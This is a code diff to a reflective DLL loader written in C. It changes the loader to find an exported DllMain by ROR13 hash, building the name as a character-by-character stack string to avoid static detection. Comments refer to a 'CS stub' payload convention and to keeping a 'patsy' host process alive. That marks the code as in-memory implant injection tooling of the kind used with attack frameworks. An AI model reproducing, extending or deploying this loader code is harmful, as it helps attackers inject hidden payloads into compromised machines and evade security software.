@@ -1429,11 +1429,24 @@ ReflectiveLoader(LPVOID param)
     /* exception directory (RtlAddFunctionTable equivalent is optional;
      * /MT DLLs work without it under SEH-less flows like ours) */
 
-    entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
-    vpn_dbg("loader: calling entry");
+    /* Prefer the exported DllMain over AddressOfEntryPoint: the /MT CRT
+     * startup at the PE entry short-circuits when the image was mapped by
+     * a reflective loader instead of the OS loader (verified: it returns
+     * TRUE without ever reaching DllMain). Our DllMain only uses IAT
+     * imports and intrinsic helpers, so CRT init is not required. */
+    {
+        volatile char nDM[8];
+        DWORD hDM;
+        nDM[0]='D'; nDM[1]='l'; nDM[2]='l'; nDM[3]='M';
+        nDM[4]='a'; nDM[5]='i'; nDM[6]='n'; nDM[7]=0;
+        hDM = rl_ror13_a((const char *)nDM);
+        entry = rl_resolve(newbase, hDM);
+        if (!entry) entry = newbase + nth->OptionalHeader.AddressOfEntryPoint;
+    }
+    vpn_dbg("loader: calling DllMain");
     ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
         (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);
-    vpn_dbg("loader: entry returned");
+    vpn_dbg("loader: DllMain returned");
 
     /* CS stub convention: rax is called as the payload entry after the
      * loader returns - park the calling thread so the patsy stays alive
